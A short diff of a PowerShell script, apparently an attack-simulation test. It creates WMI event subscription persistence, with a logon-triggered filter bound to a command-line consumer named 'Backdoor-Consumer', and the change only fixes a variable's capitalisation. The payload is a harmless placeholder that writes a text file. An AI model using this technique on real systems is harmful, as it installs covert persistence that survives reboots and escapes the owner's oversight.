@@ -14,7 +14,7 @@
             Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
             QueryLanguage = 'WQL'}
             # Configure Consumer with Command line
-            $command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value texttext"
+            $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value texttext"
             $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
             Name = "Backdoor-Consumer"
             CommandLineTemplate = $Command }
